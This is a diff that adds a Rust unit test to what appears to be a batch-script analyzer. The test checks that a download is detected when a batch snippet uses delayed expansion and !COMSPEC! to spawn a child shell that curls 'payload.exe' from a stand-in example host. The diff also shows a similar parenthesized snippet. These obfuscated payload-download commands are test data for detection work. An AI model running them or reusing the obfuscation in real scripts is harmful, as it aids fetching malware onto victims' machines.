@@ -19035,6 +19035,24 @@ mod if_tests {
     }
 
     #[test]
+    fn if_bang_comspec_child_preserves_delayed_expansion() {
+        let script = br#"setlocal EnableDelayedExpansion
+if "a"=="a" !COMSPEC! /V:ON /c "set U=https://if-bang-comspec.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://if-bang-comspec.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "if !COMSPEC! child did not preserve delayed expansion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn parenthesized_if_cmd_child_preserves_delayed_expansion() {
         let script = br#"if "a"=="a" (cmd.exe /V:ON /c "set U=https://if-paren.example/payload.exe&&curl -o payload.exe !U!")"#;
         let report = analyze(script, &Config::default());
